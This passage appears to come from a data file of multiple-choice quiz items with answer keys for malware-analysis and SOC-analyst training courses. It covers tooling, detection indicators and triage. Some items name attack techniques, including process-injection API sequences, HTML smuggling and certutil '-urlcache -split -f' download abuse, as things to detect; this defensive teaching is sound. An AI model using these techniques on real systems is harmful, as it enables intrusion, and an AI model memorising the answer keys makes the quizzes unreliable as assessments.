      { id: "ma-q2-4", question: "What tool recovers obfuscated strings that basic extraction misses?", options: ["strings command", "FLOSS", "file command", "hexdump"], correctAnswer: 1, explanation: "FLOSS (FireEye Labs Obfuscated String Solver) automatically deobfuscates runtime-decoded and stack-constructed strings." },
      { id: "ma-q2-5", question: "In PE analysis, what does high section entropy (>7.0) indicate?", options: ["The file is digitally signed", "The section is likely encrypted or packed", "The file has many imports", "The file was compiled in debug mode"], correctAnswer: 1, explanation: "Entropy above 7.0 (near random) strongly suggests the section content is encrypted, compressed, or packed, hiding the original code." },
      { id: "ma-q2-6", question: "Which PE import combination strongly suggests process injection?", options: ["CreateFileA + ReadFile", "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread", "RegSetValueEx + RegCreateKeyEx", "InternetOpenA + HttpSendRequest"], correctAnswer: 1, explanation: "This classic injection sequence allocates memory in another process, writes code there, and creates a remote thread to execute it." },
      { id: "ma-q2-7", question: "What does Detect It Easy (DiE) primarily identify?", options: ["Malware families", "Packers, compilers, and protectors", "Network protocols", "Encryption algorithms"], correctAnswer: 1, explanation: "DiE analyzes binary signatures to identify packers (UPX, Themida), compilers, and protectors used on the executable." },
      { id: "ma-q2-8", question: "A PE file with very few imports (only LoadLibrary and GetProcAddress) likely indicates what?", options: ["A simple utility program", "A packed or dynamically-resolving binary", "A .NET application", "A kernel driver"], correctAnswer: 1, explanation: "Minimal imports with LoadLibrary/GetProcAddress suggest the binary dynamically resolves API calls at runtime to hide its true capabilities from static analysis." },
      { id: "ma-q2-9", question: "How do you unpack a UPX-packed binary?", options: ["Use Ghidra's decompiler", "Run upx -d sample.exe", "Manually debug with x64dbg", "Extract strings with FLOSS"], correctAnswer: 1, explanation: "UPX provides a built-in decompression command (upx -d) that restores the original binary, making it one of the easiest packers to handle." },
      { id: "ma-q2-10", question: "What does a PE Rich header hash help identify?", options: ["The malware family", "The build environment and toolchain", "The target operating system", "The C2 server address"], correctAnswer: 1, explanation: "The Rich header records the compiler and linker versions used, linking samples compiled with the same development environment." }
    ]
  },
  {
    quizId: "ma-q3",
    courseId: "malware-analysis",
    title: "Dynamic & Behavioral Analysis",
    description: "Test your sandbox, process monitoring, and network capture skills.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q3-1", question: "Which sandbox allows real-time interactive analysis with manual clicking?", options: ["Cuckoo Sandbox", "ANY.RUN", "VirusTotal Sandbox", "Joe Sandbox Cloud"], correctAnswer: 1, explanation: "ANY.RUN provides an interactive mode where analysts can click through dialogs and installers in real-time during analysis." },
      { id: "ma-q3-2", question: "How does malware commonly detect it's running in a virtual machine?", options: ["Checking CPU speed", "Checking registry keys and MAC addresses", "Checking file sizes", "Checking display resolution only"], correctAnswer: 1, explanation: "Malware checks VM-specific registry keys (VMware, VirtualBox), MAC address prefixes, and hardware identifiers to detect virtualization." },
      { id: "ma-q3-3", question: "What Sysinternals tool captures real-time filesystem, registry, and process activity?", options: ["Process Hacker", "Process Monitor (ProcMon)", "Autoruns", "TCPView"], correctAnswer: 1, explanation: "Process Monitor captures detailed real-time filesystem, registry, process, and thread activity with powerful filtering." },
      { id: "ma-q3-4", question: "In Process Hacker, what does RWX memory permissions in a process indicate?", options: ["Normal application behavior", "Possible code injection", "Read-only data section", "Kernel mode access"], correctAnswer: 1, explanation: "Read-Write-Execute (RWX) memory regions are suspicious because legitimate code rarely needs all three permissions — it often indicates injected shellcode." },
      { id: "ma-q3-5", question: "What tool takes registry snapshots before and after malware execution?", options: ["Regshot", "ProcMon", "Autoruns", "RegRipper"], correctAnswer: 0, explanation: "Regshot takes two registry snapshots and compares them, revealing all keys and values added, modified, or deleted during execution." },
      { id: "ma-q3-6", question: "What does FakeNet-NG do in a malware analysis environment?", options: ["Scans files for viruses", "Intercepts and simulates network services locally", "Monitors CPU usage", "Decompiles binaries"], correctAnswer: 1, explanation: "FakeNet-NG intercepts all network traffic and simulates DNS, HTTP, SMTP, and other services so malware operates as if connected to the internet." },
      { id: "ma-q3-7", question: "Which Wireshark filter shows only DNS queries?", options: ["tcp.port == 53", "dns", "http.request", "ip.proto == 17"], correctAnswer: 1, explanation: "The 'dns' display filter shows all DNS traffic including queries and responses, useful for identifying C2 domains and DGA patterns." },
      { id: "ma-q3-8", question: "What network pattern indicates C2 beaconing?", options: ["Random burst traffic", "Regular interval connections with slight jitter", "Single large data transfer", "Only outbound UDP traffic"], correctAnswer: 1, explanation: "C2 beaconing shows regular check-in intervals (e.g., every 60 seconds) with slight random jitter to avoid detection." },
      { id: "ma-q3-9", question: "svchost.exe spawned by a non-services.exe parent process is a sign of what?", options: ["Normal Windows behavior", "Malicious process masquerading", "Windows Update running", "Driver installation"], correctAnswer: 1, explanation: "Legitimate svchost.exe is always spawned by services.exe. Any other parent indicates a malicious process impersonating svchost." },
      { id: "ma-q3-10", question: "Which API sequence indicates classic process injection?", options: ["CreateFile → ReadFile → CloseHandle", "OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread", "RegOpenKeyEx → RegSetValueEx → RegCloseKey", "WSAStartup → connect → send → recv"], correctAnswer: 1, explanation: "This sequence opens a target process, allocates memory in it, writes shellcode, and creates a thread to execute it — the classic injection pattern." }
    ]
  },
  {
    quizId: "ma-q4",
    courseId: "malware-analysis",
    title: "Document & Script Malware",
    description: "Evaluate your ability to analyze macro-based documents, PDFs, and script threats.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q4-1", question: "Which VBA subroutine name causes automatic execution when a Word document is opened?", options: ["Sub Main()", "Sub AutoOpen()", "Sub Initialize()", "Sub OnLoad()"], correctAnswer: 1, explanation: "AutoOpen() and Document_Open() are VBA auto-execution triggers that run macros automatically when the document is opened." },
      { id: "ma-q4-2", question: "What tool extracts and analyzes VBA macros from Office documents?", options: ["pdf-parser", "olevba", "FLOSS", "Wireshark"], correctAnswer: 1, explanation: "olevba (part of oletools) extracts VBA macros, identifies suspicious patterns, and attempts automatic deobfuscation." },
      { id: "ma-q4-3", question: "What VBA obfuscation technique uses Chr(80) & Chr(111) & Chr(119)?", options: ["Base64 encoding", "XOR encryption", "Character code concatenation", "String reversal"], correctAnswer: 2, explanation: "Chr() converts ASCII codes to characters, building strings character-by-character to avoid string-based detection (Chr(80)&Chr(111)&Chr(119) = 'Pow')." },
      { id: "ma-q4-4", question: "Which PDF object type triggers automatic code execution on document open?", options: ["/Encrypt", "/OpenAction", "/Metadata", "/Pages"], correctAnswer: 1, explanation: "/OpenAction specifies actions to execute automatically when the PDF is opened, commonly used to trigger JavaScript payloads." },
      { id: "ma-q4-5", question: "What tool safely emulates VBA macro execution without opening Office?", options: ["ViperMonkey", "oletools", "pdf-parser", "CyberChef"], correctAnswer: 0, explanation: "ViperMonkey emulates VBA macro execution, revealing shell commands, downloaded URLs, and dropped files without running Office applications." },
      { id: "ma-q4-6", question: "In PowerShell deobfuscation, what should you replace IEX with for safe analysis?", options: ["Remove-Item", "Write-Output", "Set-Variable", "Start-Process"], correctAnswer: 1, explanation: "Replacing IEX (Invoke-Expression) with Write-Output prints the decoded command instead of executing it, safely revealing the payload." },
      { id: "ma-q4-7", question: "What is HTML smuggling?", options: ["Injecting HTML into emails", "JavaScript constructing and downloading payloads client-side", "Encoding malware in HTML comments", "Using HTML forms for phishing"], correctAnswer: 1, explanation: "HTML smuggling uses JavaScript to construct malicious payloads (via atob, Blob, createObjectURL) in the browser, bypassing email gateway scanning." },
      { id: "ma-q4-8", question: "How are malicious LNK files typically disguised?", options: ["As system updates", "With folder icons and innocent names", "As font files", "As certificate files"], correctAnswer: 1, explanation: "Malicious LNK files use folder icons from shell32.dll and names like 'Important Documents' to trick users into clicking." },
      { id: "ma-q4-9", question: "What tool safely analyzes malicious JScript files?", options: ["node.js", "box-js", "Babel", "V8 debugger"], correctAnswer: 1, explanation: "box-js is a JavaScript sandbox that safely emulates WScript/JScript execution, extracting URLs, dropped files, and shell commands." },
      { id: "ma-q4-10", question: "What typically comes inside an ISO file delivered via HTML smuggling?", options: ["Encrypted PDF documents", "A LNK file paired with a DLL payload", "Linux executables", "Browser extensions"], correctAnswer: 1, explanation: "HTML-smuggled ISO containers typically contain a malicious LNK shortcut that executes a co-located DLL via rundll32." }
    ]
  },
  {
    quizId: "ma-q5",
    courseId: "malware-analysis",
    title: "Reverse Engineering Fundamentals",
    description: "Test your knowledge of assembly, Ghidra, debugging, and C2 protocol analysis.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q5-1", question: "What does the x86 instruction 'XOR EAX, EAX' accomplish?", options: ["Encrypts EAX", "Sets EAX to zero", "Copies EAX to memory", "Compares EAX with zero"], correctAnswer: 1, explanation: "XOR-ing a register with itself always produces zero. This is the standard pattern for zeroing registers because it's faster than MOV EAX, 0." },
      { id: "ma-q5-2", question: "In x64 Windows calling convention, which register holds the first function argument?", options: ["RAX", "RCX", "RDX", "RDI"], correctAnswer: 1, explanation: "x64 Windows (fastcall) passes the first four arguments in RCX, RDX, R8, R9. Linux System V uses RDI, RSI, RDX, RCX." },
      { id: "ma-q5-3", question: "What does Ghidra's decompiler provide?", options: ["Network traffic analysis", "C-like pseudocode from binary disassembly", "Sandbox execution", "String decryption"], correctAnswer: 1, explanation: "Ghidra's decompiler converts assembly instructions back into readable C-like pseudocode, dramatically speeding up analysis." },
      { id: "ma-q5-4", question: "What technique should you use aggressively while analyzing code in Ghidra?", options: ["Running the sample", "Renaming functions and variables", "Deleting unused code", "Patching instructions"], correctAnswer: 1, explanation: "Renaming functions (FUN_00401000 → decrypt_config) and variables as you understand them makes the decompiled code progressively more readable." },
      { id: "ma-q5-5", question: "In x64dbg, what does F7 do?", options: ["Step Over (skip function calls)", "Step Into (follow function calls)", "Run to cursor", "Toggle breakpoint"], correctAnswer: 1, explanation: "F7 steps into function calls, following execution into the called function. F8 steps over, treating the call as a single instruction." },
      { id: "ma-q5-6", question: "Why are hardware breakpoints preferred when debugging packed malware?", options: ["They are faster", "They survive self-modifying code and are undetectable", "They can monitor network traffic", "They work on Linux only"], correctAnswer: 1, explanation: "Hardware breakpoints use CPU debug registers, so they survive code modification and aren't detectable by common anti-debugging techniques." },
      { id: "ma-q5-7", question: "What x64dbg plugin defeats most anti-debugging techniques automatically?", options: ["OllyDump", "ScyllaHide", "IDA Sync", "x64dbg Automation"], correctAnswer: 1, explanation: "ScyllaHide patches PEB flags, timing functions, and NTDLL hooks to automatically defeat IsDebuggerPresent, NtQueryInformationProcess, and timing checks." },
      { id: "ma-q5-8", question: "What is the most common encryption method used by malware for C2 communication?", options: ["AES-256", "RSA", "XOR", "Blowfish"], correctAnswer: 2, explanation: "XOR encryption is the most common in malware due to simplicity — it's trivially reversible but effective enough against basic detection." },
      { id: "ma-q5-9", question: "What is a Domain Generation Algorithm (DGA)?", options: ["An algorithm to register legitimate domains", "Code that generates pseudo-random domain names for C2", "A DNS security protocol", "A method to encrypt domain queries"], correctAnswer: 1, explanation: "DGAs generate pseudo-random domain names using seeds like dates, allowing malware to find C2 servers even if known domains are taken down." },
      { id: "ma-q5-10", question: "When malware calls LoadLibraryA + GetProcAddress repeatedly, what is it doing?", options: ["Loading configuration files", "Dynamically resolving API functions at runtime", "Checking for debuggers", "Installing device drivers"], correctAnswer: 1, explanation: "Dynamic API resolution loads DLLs and resolves function addresses at runtime, hiding the malware's true capabilities from the import table." }
    ]
  },
  {
    quizId: "ma-q6",
    courseId: "malware-analysis",
    title: "Reporting & Threat Intelligence",
    description: "Assess your malware reporting, IOC extraction, and attribution skills.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q6-1", question: "Which IOC type is considered 'atomic' (easily searchable)?", options: ["Behavioral patterns", "File hashes and IP addresses", "MITRE ATT&CK techniques", "Attack timelines"], correctAnswer: 1, explanation: "Atomic indicators like file hashes, IPs, and domains are simple, searchable values that can be directly queried in security tools." },
      { id: "ma-q6-2", question: "What format is the industry standard for machine-readable threat intelligence?", options: ["CSV", "STIX 2.1", "XML", "YAML"], correctAnswer: 1, explanation: "STIX (Structured Threat Information Expression) 2.1 is the standard JSON-based format for expressing and sharing cyber threat intelligence." },
      { id: "ma-q6-3", question: "What protocol enables automated IOC sharing between organizations?", options: ["SMTP", "TAXII", "SNMP", "LDAP"], correctAnswer: 1, explanation: "TAXII (Trusted Automated Exchange of Intelligence Information) is the transport protocol for sharing STIX-formatted threat intelligence." },
      { id: "ma-q6-4", question: "In a YARA rule, what does 'uint16(0) == 0x5A4D' check?", options: ["File size", "That the file is a PE executable (MZ header)", "String encoding", "Section count"], correctAnswer: 1, explanation: "This condition checks that the first two bytes are 0x4D5A (MZ in little-endian), confirming the file is a PE executable." },
      { id: "ma-q6-5", question: "What should a malware analysis report's executive summary focus on?", options: ["Detailed assembly analysis", "Non-technical risk assessment and recommended actions", "Complete IOC listing", "Tool configuration details"], correctAnswer: 1, explanation: "Executive summaries are for non-technical leadership and should focus on what the malware does, the risk level, and recommended actions." },
      { id: "ma-q6-6", question: "Which framework maps malware behaviors to standardized tactics and techniques?", options: ["NIST CSF", "MITRE ATT&CK", "ISO 27001", "OWASP"], correctAnswer: 1, explanation: "MITRE ATT&CK maps observed adversary behaviors to standardized tactics, techniques, and procedures, providing a shared language for threat reporting." },
      { id: "ma-q6-7", question: "What YARA string modifier matches both ASCII and UTF-16LE encodings?", options: ["nocase", "fullword", "ascii wide", "base64"], correctAnswer: 2, explanation: "Using both 'ascii' and 'wide' modifiers on a string ensures it matches whether encoded as ASCII or UTF-16LE (common in Windows)." },
      { id: "ma-q6-8", question: "For attribution, what confidence level requires multiple independent technical overlaps?", options: ["Low", "Medium", "High", "Confirmed"], correctAnswer: 1, explanation: "Medium confidence requires multiple technical overlaps such as code similarity AND infrastructure reuse. High adds operational and historical consistency." },
      { id: "ma-q6-9", question: "What tool compares two binaries for shared functions at the code level?", options: ["ssdeep", "BinDiff", "YARA", "CyberChef"], correctAnswer: 1, explanation: "BinDiff compares binary executables at the function level, identifying shared code between samples to link them to the same author or family." },
      { id: "ma-q6-10", question: "What does passive DNS data reveal about threat actor infrastructure?", options: ["Malware source code", "Historical domain-to-IP mappings showing infrastructure reuse", "Encryption keys", "Victim identities"], correctAnswer: 1, explanation: "Passive DNS records historical domain resolutions, revealing when domains pointed to which IPs and identifying infrastructure overlap between campaigns." }
    ]
  },
  // SOC ANALYST LEARNING PATH QUIZZES
  {
    quizId: "sap-q1",
    courseId: "soc-analyst-path",
    title: "SOC Analyst Foundations Quiz",
    description: "Test your understanding of the SOC analyst role, maturity models, and compliance.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "sap-q1-1", question: "What is the primary purpose of a SOC maturity model?", options: ["To rank analysts", "To assess and improve SOC capabilities", "To determine salaries", "To select SIEM vendors"], correctAnswer: 1, explanation: "SOC maturity models assess capabilities across People, Process, Technology, Services, and Governance." },
      { id: "sap-q1-2", question: "GDPR requires breach notification within how many hours?", options: ["24", "48", "72", "96"], correctAnswer: 2, explanation: "GDPR mandates 72-hour breach notification to supervisory authority." },
      { id: "sap-q1-3", question: "What is the minimum log retention under PCI-DSS?", options: ["6 months", "1 year", "3 years", "7 years"], correctAnswer: 1, explanation: "PCI-DSS requires 1 year retention with 3 months immediately available." },
      { id: "sap-q1-4", question: "Which NIST CSF functions are the SOC's primary focus?", options: ["Identify and Protect", "Detect and Respond", "Recover and Govern", "Protect and Recover"], correctAnswer: 1, explanation: "Detect and Respond are the primary SOC functions in NIST CSF." },
      { id: "sap-q1-5", question: "How many alerts should a typical L1 analyst triage per shift?", options: ["5-10", "10-20", "30-60", "100-200"], correctAnswer: 2, explanation: "A typical L1 analyst targets 30-60 alerts per shift." },
      { id: "sap-q1-6", question: "What percentage of alerts should typically be escalated?", options: ["1-3%", "5-15%", "25-35%", "50-60%"], correctAnswer: 1, explanation: "Typically 5-15% of alerts are escalated from L1 to L2." },
      { id: "sap-q1-7", question: "What compliance framework addresses healthcare data?", options: ["PCI-DSS", "SOX", "HIPAA", "GDPR"], correctAnswer: 2, explanation: "HIPAA addresses protection of healthcare data (ePHI)." },
      { id: "sap-q1-8", question: "SOX compliance applies to which organizations?", options: ["Healthcare providers", "Publicly traded companies", "Educational institutions", "Non-profits"], correctAnswer: 1, explanation: "SOX applies to publicly traded companies." },
      { id: "sap-q1-9", question: "What is the relationship between compliance and security?", options: ["They're the same", "Compliance is the ceiling", "Compliance is the floor — security goes beyond", "Security is unnecessary if compliant"], correctAnswer: 2, explanation: "Compliance is the minimum — true security goes beyond regulatory requirements." },
      { id: "sap-q1-10", question: "What should you do with an investigation VM after analyzing malware?", options: ["Keep using it", "Revert to clean snapshot", "Share with colleagues", "Connect to production"], correctAnswer: 1, explanation: "Always revert to clean snapshot after malware analysis." },
      { id: "sap-q1-11", question: "What is the first step in alert triage?", options: ["Block source IP", "Escalate to management", "Review alert details and assess", "Run full forensic analysis"], correctAnswer: 2, explanation: "First review alert details and initial assessment before any action." },
      { id: "sap-q1-12", question: "What is the purpose of shift handover?", options: ["Evaluate performance", "Ensure continuity between shifts", "Report to management", "Assign blame"], correctAnswer: 1, explanation: "Handovers ensure smooth transitions and prevent dropped incidents." },
      { id: "sap-q1-13", question: "Which tool is essential for a SOC analyst's toolkit?", options: ["Photoshop", "VirusTotal", "Microsoft Word", "Social media"], correctAnswer: 1, explanation: "VirusTotal is essential for analyzing hashes, URLs, IPs, and domains." },
      { id: "sap-q1-14", question: "How many SOC-CMM maturity levels exist?", options: ["3", "4", "5", "6"], correctAnswer: 3, explanation: "SOC-CMM has 6 levels (0-5): Incomplete through Optimizing." },
      { id: "sap-q1-15", question: "What does PCI-DSS Requirement 10 mandate?", options: ["Penetration testing", "Track and monitor all access to network resources", "Background checks", "Physical security"], correctAnswer: 1, explanation: "Req 10 mandates tracking and monitoring all access to network resources and cardholder data." }
    ]
  },
  {
    quizId: "sap-q2",
    courseId: "soc-analyst-path",
    title: "Network Traffic Analysis Quiz",
    description: "Evaluate your TCP/IP analysis, DNS threats, and packet inspection skills.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q2-1", question: "What indicates a SYN scan?", options: ["SYN→ACK→RST", "SYN→SYN-ACK→RST (no final ACK)", "FIN+PSH+URG", "ACK only"], correctAnswer: 1, explanation: "SYN scan sends SYN, receives SYN-ACK, sends RST without completing handshake." },
      { id: "sap-q2-2", question: "What indicates C2 beaconing?", options: ["Random connections to many IPs", "Regular intervals with consistent sizes to same destination", "Large CDN downloads", "DNS to google.com"], correctAnswer: 1, explanation: "C2 beaconing shows regular timing with consistent packet sizes to the same destination." },
      { id: "sap-q2-3", question: "Windows systems typically use what TTL value?", options: ["32", "64", "128", "255"], correctAnswer: 2, explanation: "Windows uses TTL=128, Linux uses TTL=64." },
      { id: "sap-q2-4", question: "What is DNS tunneling?", options: ["Encrypting DNS", "Encoding data in DNS queries to bypass firewalls", "Blocking DNS", "DNS over HTTPS"], correctAnswer: 1, explanation: "DNS tunneling encodes data in subdomain labels to communicate covertly." },
      { id: "sap-q2-5", question: "What indicates DGA malware?", options: ["Normal browsing", "Excessive NXDomain responses from one host", "DNS misconfiguration", "High bandwidth"], correctAnswer: 1, explanation: "DGA generates many domains, most of which don't resolve (NXDomain)." },
      { id: "sap-q2-6", question: "What does fast-flux DNS involve?", options: ["Rapid IP rotation with very low TTL", "Slow resolution", "Static IPs", "DNS caching"], correctAnswer: 0, explanation: "Fast-flux rapidly rotates IPs (every 30-60s) using very low TTL." },
      { id: "sap-q2-7", question: "Which User-Agent is suspicious?", options: ["Mozilla/5.0 (Windows NT 10.0)", "Python-urllib/3.8", "Chrome/120.0", "Safari/537.36"], correctAnswer: 1, explanation: "Python-urllib indicates automated scripting, unusual for normal browsing." },
      { id: "sap-q2-8", question: "Wireshark filter for HTTP POST requests?", options: ["http.post", "http.request.method == \"POST\"", "tcp.method == POST", "filter.http.post"], correctAnswer: 1, explanation: "The correct filter is http.request.method == \"POST\"." },
      { id: "sap-q2-9", question: "What is JA3 fingerprinting used for?", options: ["File types", "Identifying TLS client implementations/malware", "Passwords", "DNS"], correctAnswer: 1, explanation: "JA3 fingerprints TLS client hellos to identify specific malware families." },
      { id: "sap-q2-10", question: "Which port is used for SMB lateral movement?", options: ["22", "80", "443", "445"], correctAnswer: 3, explanation: "Port 445 (SMB) is commonly used for lateral movement and ransomware." },
      { id: "sap-q2-11", question: "What DNS indicator suggests tunneling?", options: ["Short queries", "Long subdomains with high entropy", "Standard A records", "Business hours queries"], correctAnswer: 1, explanation: "DNS tunneling creates long, high-entropy subdomain labels." },
      { id: "sap-q2-12", question: "How to follow a TCP conversation in Wireshark?", options: ["Edit → Preferences", "Right-click → Follow → TCP Stream", "Statistics → Conversations", "Analyze → Stream"], correctAnswer: 1, explanation: "Right-click a packet and Follow → TCP Stream reconstructs the conversation." },
      { id: "sap-q2-13", question: "What does XMAS scan send?", options: ["SYN only", "ACK only", "FIN + PSH + URG", "No flags"], correctAnswer: 2, explanation: "XMAS scan sets FIN, PSH, and URG flags — unusual combination for evasion." },
      { id: "sap-q2-14", question: "Purpose of proxy log analysis in SOC?", options: ["Employee productivity", "Detecting web threats, exfiltration, and C2", "Network speed", "Bandwidth management"], correctAnswer: 1, explanation: "Proxy logs detect web threats, data exfiltration, and C2 communication." },
      { id: "sap-q2-15", question: "What is a DGA domain characteristic?", options: ["Long meaningful words", "High entropy random characters", "Only .com TLD", "Static IP"], correctAnswer: 1, explanation: "DGA domains have high entropy (random-looking characters) like xkq8r3m2p.com." }
    ]
  },
  {
    quizId: "sap-q3",
    courseId: "soc-analyst-path",
    title: "SIEM Mastery Assessment",
    description: "Test SIEM queries, correlation rules, and dashboard skills.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      { id: "sap-q3-1", question: "What function counts unique values in SIEM?", options: ["count()", "sum()", "dc() / distinct_count()", "avg()"], correctAnswer: 2, explanation: "dc() counts unique values, useful for finding hosts accessed by a single IP." },
      { id: "sap-q3-2", question: "Best approach to designing correlation rules?", options: ["Start with log sources", "Start with MITRE ATT&CK technique", "Copy from others", "Single-event rules only"], correctAnswer: 1, explanation: "Threat-informed design starts with the attack technique, then maps to data sources." },
      { id: "sap-q3-3", question: "Why is multi-event correlation better?", options: ["More alerts", "Reduces false positives", "Easier to write", "Less resources"], correctAnswer: 1, explanation: "Multiple conditions produce higher confidence alerts." },
      { id: "sap-q3-4", question: "Process chain indicating macro attack?", options: ["explorer→chrome", "winword→cmd→powershell", "svchost→services", "lsass→csrss"], correctAnswer: 1, explanation: "Office apps spawning CLI tools indicates macro execution." },
      { id: "sap-q3-5", question: "Max panels for a SOC dashboard?", options: ["2-4", "8-10", "20-30", "As many as possible"], correctAnswer: 1, explanation: "Limit to 8-10 panels to prevent information overload." },
      { id: "sap-q3-6", question: "First step in log source onboarding?", options: ["Write rules", "Install agent", "Identify source and log format", "Create dashboards"], correctAnswer: 2, explanation: "First identify the device, events, format, and expected volume." },
      { id: "sap-q3-7", question: "What is field normalization?", options: ["Deleting fields", "Mapping vendor fields to common schema", "Encrypting values", "Reducing count"], correctAnswer: 1, explanation: "Normalization maps source-specific fields to unified schema for cross-source correlation." },
      { id: "sap-q3-8", question: "How to handle high FP rate on a rule?", options: ["Delete rule", "Ignore alerts", "Add whitelists, adjust thresholds, add context", "Blame vendor"], correctAnswer: 2, explanation: "Tune with whitelists, adjusted thresholds, and context conditions." },
      { id: "sap-q3-9", question: "What makes a dashboard 'actionable'?", options: ["Colorful charts", "Drill-down links to detailed searches", "Many data points", "Complex visuals"], correctAnswer: 1, explanation: "Actionable dashboards allow clicking any panel to drill into underlying data." },
      { id: "sap-q3-10", question: "SIEM query detecting RDP lateral movement?", options: ["Count distinct targets per source for logon type 10", "Count total logins", "Search failed passwords", "Filter by user agent"], correctAnswer: 0, explanation: "Count distinct target hosts per source IP for RDP (logon type 10)." },
      { id: "sap-q3-11", question: "What is a cool-down period?", options: ["SIEM restart time", "Suppression window preventing repeated alerts", "Time between updates", "User timeout"], correctAnswer: 1, explanation: "Cool-downs suppress repeated alerts for the same condition within a time window." },
      { id: "sap-q3-12", question: "What to validate after log source onboarding?", options: ["Only event receipt", "Timestamps, parsing, volume, searchability, no gaps", "Just field names", "Only connection"], correctAnswer: 1, explanation: "Validate timestamps, field parsing, volume, searchability, and absence of gaps." },
      { id: "sap-q3-13", question: "First query optimization technique?", options: ["Regex everywhere", "Apply time and source filters early", "Remove all filters", "Search all indices"], correctAnswer: 1, explanation: "Filter early to reduce data the SIEM needs to process." },
      { id: "sap-q3-14", question: "Ransomware detection rule is based on?", options: ["Network volume", "High file renames with known ransomware extensions", "Login patterns", "Email volume"], correctAnswer: 1, explanation: "Detect rapid file renames (>50 in 5 min) with extensions like .encrypted, .locked." },
      { id: "sap-q3-15", question: "What is baseline deviation used for?", options: ["SIEM setup", "Detecting anomalies vs historical norms", "Deleting logs", "User accounts"], correctAnswer: 1, explanation: "Baseline deviation compares current behavior to historical averages for anomaly detection." }
    ]
  },
  {
    quizId: "sap-q4",
    courseId: "soc-analyst-path",
    title: "Endpoint Investigation Quiz",
    description: "Assess endpoint forensics on Windows and Linux.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "sap-q4-1", question: "Expected parent of svchost.exe?", options: ["explorer.exe", "winlogon.exe", "services.exe", "csrss.exe"], correctAnswer: 2, explanation: "svchost.exe should always be a child of services.exe." },
      { id: "sap-q4-2", question: "What are LOLBins?", options: ["Malware types", "Legitimate Windows binaries abused by attackers", "Logging binaries", "Linux commands"], correctAnswer: 1, explanation: "LOLBins are legitimate tools (certutil, mshta) abused for malicious purposes." },
      { id: "sap-q4-3", question: "Common persistence registry key?", options: ["HKLM\\HARDWARE", "HKLM\\...\\CurrentVersion\\Run", "HKCU\\Console", "HKLM\\SAM"], correctAnswer: 1, explanation: "Run keys auto-start programs listed there." },
      { id: "sap-q4-4", question: "What is process hollowing?", options: ["Deleting process", "Creating suspended process, replacing memory with malicious code", "Running hollow executable", "Monitoring memory"], correctAnswer: 1, explanation: "Process hollowing replaces legitimate process memory with malicious code." },
      { id: "sap-q4-5", question: "Linux command for network connections with PIDs?", options: ["ls -la", "ss -tnp", "cat /etc/passwd", "df -h"], correctAnswer: 1, explanation: "ss -tnp shows TCP connections with associated process IDs." },
      { id: "sap-q4-6", question: "Volatility plugin for injected code?", options: ["pslist", "netscan", "malfind", "hivelist"], correctAnswer: 2, explanation: "malfind finds suspicious RWX memory regions and PE headers." },
      { id: "sap-q4-7", question: "Why capture memory before shutdown?", options: ["Memory is permanent", "Volatile data is lost on shutdown", "It's faster", "Save disk space"], correctAnswer: 1, explanation: "Running processes, connections, and decrypted data disappear on shutdown." },
      { id: "sap-q4-8", question: "Linux persistence through user login?", options: ["/var/log/syslog", "/home/user/.bashrc", "/etc/hostname", "/boot/grub/grub.cfg"], correctAnswer: 1, explanation: ".bashrc executes every bash shell — attackers add malicious commands." },
      { id: "sap-q4-9", question: "PAGE_EXECUTE_READWRITE indicates?", options: ["Normal behavior", "Potentially injected code", "Kernel protection", "Memory corruption"], correctAnswer: 1, explanation: "RWX permissions are unusual and often indicate injected shellcode." },
      { id: "sap-q4-10", question: "Find recently modified PHP files?", options: ["ls /var/www", "find /var/www -name '*.php' -mtime -7", "grep php /etc/passwd", "cat index.php"], correctAnswer: 1, explanation: "find with -mtime -7 finds PHP files modified in last 7 days for web shell detection." },
      { id: "sap-q4-11", question: "Tool showing ALL Windows autostart locations?", options: ["Process Monitor", "Process Explorer", "Autoruns", "TCPView"], correctAnswer: 2, explanation: "Autoruns shows every autostart location including Run keys, services, tasks, drivers, WMI." },
      { id: "sap-q4-12", question: "Key indicator of certutil abuse?", options: ["Certificate management", "-urlcache -split -f to download from external URLs", "Viewing cert stores", "Verifying signatures"], correctAnswer: 1, explanation: "certutil with -urlcache -split -f downloading from external URLs is common LOLBin abuse." },
      { id: "sap-q4-13", question: "pslist vs psscan comparison reveals?", options: ["Memory usage", "Hidden/unlinked processes", "File system", "Bandwidth"], correctAnswer: 1, explanation: "psscan scans all memory while pslist uses active lists — differences reveal hidden processes." },
      { id: "sap-q4-14", question: "WMI persistence namespace?", options: ["root/default", "root/subscription", "root/cimv2", "root/security"], correctAnswer: 1, explanation: "root/subscription contains WMI event subscriptions for fileless persistence." },
      { id: "sap-q4-15", question: "First triage step on compromised Linux server?", options: ["Reboot", "Check processes, network, and logins", "Reinstall OS", "Delete logs"], correctAnswer: 1, explanation: "Check ps auxf, ss -tnp, and last/w before any remediation." }
    ]
  },
  {
    quizId: "sap-q5",
    courseId: "soc-analyst-path",
    title: "Phishing & Email Analysis Quiz",
    description: "Validate email header analysis and phishing response skills.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q5-1", question: "Email headers should be read in which order?", options: ["Top to bottom", "Bottom to top", "Alphabetically", "By type"], correctAnswer: 1, explanation: "Bottom-to-top — oldest entries are at the bottom." },
      { id: "sap-q5-2", question: "What does SPF verify?", options: ["Content", "Whether sending IP is authorized for the domain", "Encryption", "Recipient identity"], correctAnswer: 1, explanation: "SPF verifies that the sending IP is authorized for the sender's domain." },
      { id: "sap-q5-3", question: "Strong BEC/phishing indicator in headers?", options: ["Valid DKIM", "From differs from Reply-To", "SPF pass", "Standard X-Mailer"], correctAnswer: 1, explanation: "Mismatched From and Reply-To means replies go to attacker's address." },
      { id: "sap-q5-4", question: "Tool for extracting VBA macros?", options: ["Wireshark", "olevba (oletools)", "Nmap", "Autoruns"], correctAnswer: 1, explanation: "olevba extracts and analyzes VBA macros from Office documents." },
